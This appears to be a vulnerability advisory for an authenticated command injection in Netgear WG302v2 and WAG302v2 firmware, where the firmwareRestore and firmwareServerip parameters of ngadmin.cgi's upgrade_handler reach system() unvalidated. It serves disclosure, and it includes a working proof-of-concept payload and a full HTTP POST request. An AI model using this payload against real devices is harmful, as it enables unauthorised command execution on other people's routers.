# upgrade_handler Command Injection

Netgear WG302v2 and WAG302v2 are vulnerable to an authenticated OS command injection vulnerability via the Upgrade Firmware functionality in the Web interface, using the metacharacters in the ngadmin.cgi?action=upgrade_handler firmwareRestore or firmwareServerip parameter.

## Affected Versions

* [WG302v2](https://www.netgear.com/support/product/wg302v2#download)
  * [5.2.9](https://www.downloads.netgear.com/files/GDC/WG302V2/WG302v2%20Firmware%20Version%205.2.9.zip)
* [WAG302v2](https://www.netgear.com/support/product/wag302v2#download)
  * [5.1.19](https://www.downloads.netgear.com/files/GDC/WAG302V2/WAG302v2%20Firmware%20Version%205.1.19%20(North%20America).zip)

## The Vulnerability

In the upgrade_handler function, the firmwareRestore and firmwareServerip are read from user inputs, and send to tftp function (FUN_00031ad0).

![](./upgrade_handler.png)

In the tftp function, the two parameters are formatted in a string, which is used in system(). However, the parameters' values are not validated. Therefore an attacker can craft inputs starting with metacharacters like ';' to inject arbitary command.

![](./tftp.png)

## PoC

Start the router and authenticate as admin
Input the following payload into firmwareRestore or to perform command injection:

```
firmware-upgrade-file=up&firmwareRestore=;$CMD;&firmwareServerip=;$CMD;
```

Full PoC

```
POST /ngadmin.cgi?action=upgrade_handler HTTP/1.1
Host: localhost
Connection: keep-alive
Content-Length: 114
Cache-Control: max-age=0
Origin: http://localhost
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
User-Agent: Xxxxxxxx
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Referer: http://localhost/ngadmin.cgi?action=up
Accept-Encoding: gzip, deflate
Accept-Language: fr-FR,fr;q=0.8,en-US;q=0.6,en;q=0.4
Cookie: sessionHTTP=PENcqbtRRuvmuZfPZnzuUddVIEAPADBp; clickedFolderFrameless=43%5E

firmware-upgrade-file=up&firmwareRestore=;$CMD;&firmwareServerip=;$CMD;
```

## Timeline
